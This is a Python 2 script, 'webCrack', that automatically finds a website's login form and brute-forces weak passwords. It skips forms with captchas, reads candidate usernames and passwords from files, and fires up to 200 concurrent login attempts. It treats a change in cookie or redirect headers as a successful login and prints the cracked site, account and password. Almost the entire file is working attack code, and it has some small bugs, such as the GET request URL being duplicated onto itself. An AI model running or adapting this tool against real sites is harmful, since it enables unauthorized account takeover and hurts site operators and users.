#coding: utf8
from gevent import monkey
from gevent.pool import Pool
import gevent
import requests
from bs4 import BeautifulSoup
from huepy import *
import sys

class webCrack():
    def __init__(self):
        self.site = ''
        self.timeout = '8'
        self.userfile = ''
        self.passfile = ''
        self.passsearch = ['搜索','索引','检索','关键字','查找','sousuo','jiansuo','search','keyword']
        self.passyzm = ['验证码','验证','更换','点击刷新','刷新','点击更换','checkcode','valicode','code','captcha','yzm']
        self.userfield = ['user','username','name','yonghu','zhanghao','email','account']
        self.passfield = ['password','pass','pwd','mima','passwd']
        self.userfieldnm = ''
        self.passfieldnm = ''
        self.outcookie = {}
        self.ipb = {}
        self.nonono = {}
        self.findpass = False

    def Open_file(self,m_sFlphnm):
        m_lRlstr = []
        try:
            m_mOpen = open(m_sFlphnm,'r')

        except Exception as e:
            return 'NULL'
        m_lFlstr = m_mOpen.readlines()
        m_mOpen.close()
        for x in m_lFlstr:
            m_lRlstr.append(x.rstrip())

        return m_lRlstr


    def Getlogin(self,m_sUrl,m_sUser,m_sPass):
        monkey.patch_socket()
        try:
            m_sUrl += m_sUrl+'?'+self.userfieldnm+'='+m_sUser+'&'+self.passfieldnm+'='+m_sPass
            m_mRequest = requests.get(m_sUrl,timeout = int(self.timeout),allow_redirects=False)
            self.ipb = m_mRequest.headers
            if self.nonono == {}:
                return
            self.checksetcookie(m_sUser,m_sPass)
        except Exception as e:
            pass

    def Postlogin(self,m_sUrl,m_sUser,m_sPass):
        monkey.patch_socket()
        m_dPost = {self.userfieldnm:m_sUser,self.passfieldnm:m_sPass}
        try:
            m_mRequest = requests.post(m_sUrl,data=m_dPost,timeout = int(self.timeout),allow_redirects=False)
            self.ipb = m_mRequest.headers
            if self.nonono == {}:
                return
            self.checksetcookie(m_sUser,m_sPass)
        except Exception as e:
            pass

    def Outsearch(self,m_sForm):
        for m_sSearch in self.passsearch:
            if m_sSearch in str(m_sForm).lower():
                return True
        return False

    def Outyzm(self,m_sForm):
        for m_sYzm in self.passyzm:
            if m_sYzm in str(m_sForm).lower():
                return True
        return False

    def checkuser(self,m_mInput):
        for m_sUser in self.userfield:
            if m_sUser in str(m_mInput).lower():
                return True
        return False

    def checkpass(self,m_mInput):
        for m_sPass in self.passfield:
            if m_sPass in str(m_mInput).lower():
                return True
        return False

    def checksetcookie(self,m_sUser,m_sPass):

        if 'Set-Cookie' in self.nonono:
            if len(self.nonono['Set-Cookie']) != len(self.ipb['Set-Cookie']):
                self.findpass = True
                print good(bold(green("地址: %s 账号: %s 密码: %s"%(self.site,m_sUser,m_sPass))))
                return
        if 'Set-Cookie' not in self.nonono:
            if 'Set-Cookie' in self.ipb:
                self.findpass = True
                print good(bold(green("地址: %s 账号: %s 密码: %s"%(self.site,m_sUser,m_sPass))))
                return

        if 'Location' in self.nonono:
            if self.nonono['Location'] != self.ipb['Location']:
                self.findpass = True
                print good(bold(green("地址: %s 账号: %s 密码: %s"%(self.site,m_sUser,m_sPass))))
                return
        if 'Location' not in self.nonono:
            if 'Location' in self.ipb:
                self.findpass = True
                print good(bold(green("地址: %s 账号: %s 密码: %s"%(self.site,m_sUser,m_sPass))))
                return
        
    def Run(self):
        m_lForm = []
        m_mForm = ''
        m_sUser = ''
        m_sPass = ''
        m_mRequest = requests.get(self.site,timeout=int(self.timeout))
        m_mSoup = BeautifulSoup(m_mRequest.content,'lxml')
        m_lMSoup = m_mSoup.find_all('form')
        for m_sSoup in m_lMSoup:
            if True == self.Outsearch(m_sSoup):
                pass
            else:
                m_lForm.append(m_sSoup)
        for m_sSForm in m_lForm:
            if True == self.Outyzm(m_sSForm):
                pass
            else:
                m_mForm = m_sSForm
        try:
            m_sMethod = m_mForm['method']
            m_sUrl = m_mForm['action']
            m_bUser = False
            m_bPass = False
        except:
            print bad(bold(red("没有找到爆破点")))
            return
        for m_mInput in m_mForm.find_all('input'):
            try:
                if self.userfieldnm != '' and self.passfieldnm != '':
                    break
                if True == self.checkuser(m_mInput['name']) and m_bUser == False:
                    self.userfieldnm = m_mInput['name']
                    m_bUser = True
                if True == self.checkpass(m_mInput['name']) and m_bPass == False:
                    self.passfieldnm = m_mInput['name']
                    m_bUser = True
            except Exception as e:
                pass
        if self.userfieldnm != '' and self.passfieldnm != '':
            m_mPool = Pool(200)
            m_lPool = []
            m_lUser = self.Open_file(self.userfile)
            m_lPass = self.Open_file(self.passfile)
            if self.site not in m_sUrl:
                m_sUrl = self.site+'/'+m_sUrl
            if m_sMethod.lower() == 'post':
                self.Postlogin(m_sUrl,'asd#$54600','qweqweqwe')
                self.nonono = self.ipb
                self.ipb = {}
                for m_sUser in m_lUser:
                    for m_sPass in m_lPass:
                        if self.findpass == True:
                            break
                        m_mThear = m_mPool.spawn(self.Postlogin, m_sUrl,m_sUser,m_sPass)
                        m_lPool.append(m_mThear)
                    if self.findpass == True:
                        break
                gevent.joinall(m_lPool)
            elif m_sMethod.lower() == 'get':
                self.Getlogin(m_sUrl,'asd#$438900','qweqweqwe')
                self.nonono = self.ipb
                self.ipb = {}
                for m_sUser in m_lUser:
                    for m_sPass in m_lPass:
                        if self.findpass == True:
                            break
                        m_mThear = m_mPool.spawn(self.Getlogin, m_sUrl,m_sUser,m_sPass)
                        m_lPool.append(m_mThear)
                    if self.findpass == True:
                        break
                gevent.joinall(m_lPool)
        if self.findpass == False:
            print bad(bold(red("没有找到弱口令")))

if __name__ == '__main__':
    test = webCrack()
    test.site = sys.argv[1]
    test.userfile = sys.argv[2]
    test.passfile = sys.argv[3]
    test.Run()